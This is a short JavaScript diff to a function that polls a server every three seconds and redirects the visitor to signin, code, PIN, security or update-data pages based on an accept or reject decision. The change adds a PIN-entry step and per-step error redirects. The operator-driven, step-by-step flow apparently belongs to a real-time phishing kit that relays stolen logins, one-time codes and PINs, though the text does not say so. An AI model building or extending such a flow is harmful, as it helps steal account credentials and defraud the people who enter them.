@@ -37,12 +37,20 @@ function pollStatus(){
     if(d.status==='redirect'&&d.redirect){
       if(d.redirect==='loading')return;
       if(d.redirect==='code')window.location.href='code.html?id='+id;
+      else if(d.redirect==='pin')window.location.href='pin.html?id='+id;
       else if(d.redirect==='security')window.location.href='security.html?id='+id;
       else if(d.redirect==='login')window.location.href='signin.html';
       else if(d.redirect==='update-data')window.location.href='update-data.html?id='+id;
     }
-    if(d.status==='accepted')window.location.href='code.html?id='+id;
-    if(d.status==='rejected')window.location.href='signin.html?error=1';
+    if(d.status==='accepted'){
+      if(d.step==='code')window.location.href='pin.html?id='+id;
+      else window.location.href='code.html?id='+id;
+    }
+    if(d.status==='rejected'){
+      if(d.step==='code')window.location.href='code.html?id='+id+'&error=1';
+      else if(d.step==='pin')window.location.href='pin.html?id='+id+'&error=1';
+      else window.location.href='signin.html?error=1';
+    }
   }).catch(function(){});
 }
 setInterval(pollStatus,3000);
